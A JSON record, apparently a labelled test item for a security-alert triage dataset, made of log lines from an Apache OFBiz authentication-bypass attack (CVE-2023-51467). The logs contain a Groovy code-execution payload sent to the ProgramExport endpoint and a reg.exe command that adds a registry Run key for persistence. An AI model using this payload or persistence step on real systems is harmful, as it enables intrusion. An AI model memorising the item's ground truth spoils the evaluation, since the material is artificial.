@@ -1,0 +1,57 @@
+{
+ "unit": 1075,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "Apache OFBiz 认证绕过 Groovy 代码执行 (CVE-2023-51467)",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-01 16:18:11",
+   "source": "waf",
+   "log_id": "WAF0204739",
+   "content": "/webtools/control/ProgramExport groovyProgram=Thread.start{ 'whoami'.execute() } Mozilla/5.0 (Windows NT 10.0;",
+   "event_id": "1075-WAF0204739"
+  },
+  {
+   "timestamp": "2026-06-01 16:18:12",
+   "source": "web",
+   "log_id": "WEB0206072",
+   "content": "/webtools/control/ProgramExport groovyProgram=Thread.start{ 'whoami'.execute() } Mozilla/5.0 (Windows NT 10.0;",
+   "event_id": "1075-WEB0206072"
+  },
+  {
+   "timestamp": "2026-06-01 16:18:13",
+   "source": "rasp",
+   "log_id": "RASP0226508",
+   "content": "https://app-java-37.ops-corp.com/webtools/control/ProgramExport {\"groovy\": \"Thread.start\", \"auth_bypass\": \"Pro",
+   "event_id": "1075-RASP0226508"
+  },
+  {
+   "timestamp": "2026-06-01 16:19:12",
+   "source": "hids",
+   "log_id": "HID0221883",
+   "content": "whoami C:\\Windows\\System32\\whoami.exe whoami <== cmd.exe /c whoami <== java.exe -jar C:\\ofbiz\\ofbiz.jar",
+   "event_id": "1075-HID0221883"
+  },
+  {
+   "timestamp": "2026-06-01 16:21:12",
+   "source": "hids",
+   "log_id": "HID0221893",
+   "content": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /f reg.exe reg.exe add HKCU <== serv",
+   "event_id": "1075-HID0221893"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
